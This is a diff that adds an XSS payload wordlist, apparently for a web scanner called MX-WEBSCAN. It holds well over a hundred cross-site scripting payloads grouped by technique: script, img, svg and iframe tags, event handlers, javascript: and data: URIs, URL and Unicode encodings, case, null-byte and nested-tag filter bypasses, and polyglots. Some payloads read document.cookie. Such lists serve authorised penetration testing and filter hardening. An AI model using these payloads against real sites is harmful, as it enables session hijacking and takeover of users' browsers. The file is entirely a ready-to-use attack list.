@@ -1,16 +1,240 @@
+# XSS Payloads - MX-WEBSCAN
+# Hecho en México 🇲🇽
+
+# Basic XSS
 <script>alert('XSS')</script>
 <script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(window.location)</script>
+<script>prompt('XSS')</script>
+<script>confirm('XSS')</script>
+<script>console.log('XSS')</script>
+
+# Image Based
 <img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src=1 onerror=alert(1)>
+<img src=javascript:alert(1)>
+<img src=javaScript:alert(1)>
+<img src=JaVaScRiPt:alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onmouseover=alert(1)>
+<img src=x onload=alert(1)>
+
+# SVG Based
 <svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg onload="alert(1)">
+<svg onload=alert(document.cookie)>
+<svg onload=prompt(1)>
+<svg onload=confirm(1)>
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)>
+
+# Body Based
 <body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onblur=alert(1)>
+<body onload=prompt(1)>
+<body onload=confirm(1)>
+
+# Input Based
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus>
+<input onchange=alert(1)>
+<input onselect=alert(1)>
+<input type="text" onfocus="alert(1)" autofocus>
+<input type="password" onfocus="alert(1)" autofocus>
+<textarea onfocus=alert(1) autofocus></textarea>
+
+# Iframe Based
+<iframe onload=alert(1)></iframe>
+<iframe src=javascript:alert(1)></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+
+# Link/Anchor Based
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:prompt(1)>click</a>
+<a href=javascript:confirm(1)>click</a>
+<a onmouseover=alert(1)>hover</a>
+<a onmouseover=prompt(1)>hover</a>
+
+# Div Based
+<div onmouseover=alert(1)>hover</div>
+<div onmouseenter=alert(1)>hover</div>
+<div onmouseleave=alert(1)>hover</div>
+<div onclick=alert(1)>click</div>
+<div ondblclick=alert(1)>double click</div>
+<div onload=alert(1)></div>
+
+# Event Handlers
+<button onclick=alert(1)>click</button>
+<button onfocus=alert(1) autofocus>click</button>
+<form onsubmit=alert(1)><input type=submit></form>
+<select onchange=alert(1)><option>1</option></select>
+<details open ontoggle=alert(1)></details>
+<marquee onstart=alert(1)></marquee>
+<video onloadedmetadata=alert(1)><source></video>
+<audio onloadedmetadata=alert(1)><source></audio>
+
+# JavaScript URI
 javascript:alert(1)
-"><script>alert(1)</script>
-'><script>alert(1)</script>
-</script><script>alert(1)</script>
+javascript:alert(1)//
+javascript:alert(1);//
+javascript:prompt(1)
+javascript:confirm(1)
+javascript:alert(document.cookie)
+javascript:alert(window.location)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Encoded Payloads
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+%3Csvg%20onload=alert(1)%3E
+%3Cbody%20onload=alert(1)%3E
+%3Ciframe%20src=javascript:alert(1)%3E
+%3Ca%20href=javascript:alert(1)%3Eclick%3C/a%3E
+
+# Double Encoded
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Cimg%2520src=x%2520onerror=alert(1)%253E
+%253Csvg%2520onload=alert(1)%253E
+%253Cbody%2520onload=alert(1)%253E
+
+# Unicode Encoded
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\u003cimg src=x onerror=alert(1)\u003e
+\u003csvg onload=alert(1)\u003e
+\u003cbody onload=alert(1)\u003e
+
+# HTML5 XSS
+<video><source onerror="alert(1)">
+<audio><source onerror="alert(1)">
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<embed src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<object data="javascript:alert(1)">
+
+# CSS XSS
+<style>@import 'javascript:alert(1)';</style>
+<style>body { background: url(javascript:alert(1)); }</style>
+<link rel=stylesheet href=javascript:alert(1)>
+<div style="background:url(javascript:alert(1))">
+<div style="width:expression(alert(1))">
+<xss style="behavior:url(xss.htc);">
+
+# Attribute XSS
+" onmouseover="alert(1)
+" onfocus="alert(1)
+" onload="alert(1)
+" onclick="alert(1)
+' onmouseover='alert(1)
+' onfocus='alert(1)
+' onload='alert(1)
+' onclick='alert(1)
+javascript:alert(1)
+javascript:prompt(1)
+javascript:confirm(1)
+
+# Bypass Filters
 <ScRiPt>alert(1)</ScRiPt>
+<ScRiPt>prompt(1)</ScRiPt>
+<ScRiPt>confirm(1)</ScRiPt>
 <IMG SRC=jAVasCrIPt:alert(1)>
+<IMG SRC=javascript:alert(1)>
 <IMG """><script>alert(1)</script>">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=javascript:alert("XSS")>
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+
+# Tag Without Brackets
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+
+# Nested Tags
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>prompt(1)</scr</script>ipt>
+<scr<script>ipt>confirm(1)</scr</script>ipt>
+<sc<script>ript>alert(1)</sc</script>ript>
+
+# Mixed Case
+<sCrIpT>alert(1)</sCrIpT>
+<iMg SrC=x OnErRoR=alert(1)>
+<sVg OnLoAd=alert(1)>
+<bOdY oNlOaD=alert(1)>
+<IfRaMe OnLoAd=alert(1)></IfRaMe>
+
+# Null Bytes
+%00<script>alert(1)</script>
+<script>%00alert(1)</script>
+<scri%00pt>alert(1)</script>
+<img%00 src=x onerror=alert(1)>
+<svg%00 onload=alert(1)>
+
+# New Lines
+<scr
+ipt>alert(1)</scr
+ipt>
+<im
+g src=x onerror=alert(1)>
+<sv
+g onload=alert(1)>
+<bo
+dy onload=alert(1)>
+
+# Tabs
+<scr	ipt>alert(1)</scr	ipt>
+<im	g src=x onerror=alert(1)>
+<sv	g onload=alert(1)>
+<bo	dy onload=alert(1)>
+
+# Comments
+<!--><script>alert(1)</script>
+<!--><img src=x onerror=alert(1)>
+<!--><svg onload=alert(1)>
+<!--><body onload=alert(1)>
+<--><script>alert(1)</script>
+<--><img src=x onerror=alert(1)>
+<--><svg onload=alert(1)>
+
+# Protocol Bypass
+javascript:alert(1)
+javascript:alert(1)
+javaScript:alert(1)
+JAVASCRIPT:alert(1)
+JaVaScRiPt:alert(1)
+javascript:prompt(1)
+javascript:confirm(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
+vbscript:alert(1)
+
+# Exotic Events
+<object onerror=alert(1)>
+<applet onerror=alert(1)>
+<base onmouseover=alert(1)>
+<bgsound onpropertychange=alert(1)>
+<isindex onmouseover=alert(1)>
+<keygen onfocus=alert(1) autofocus>
+<meter onmouseover=alert(1)>
+<progress onmouseover=alert(1)>
+<time onmouseover=alert(1)>
+
+# Polyglot XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+"'--></style></script><iframe onload=alert(1)>
+</script><svg><script>alert(1)-+-</script></svg>
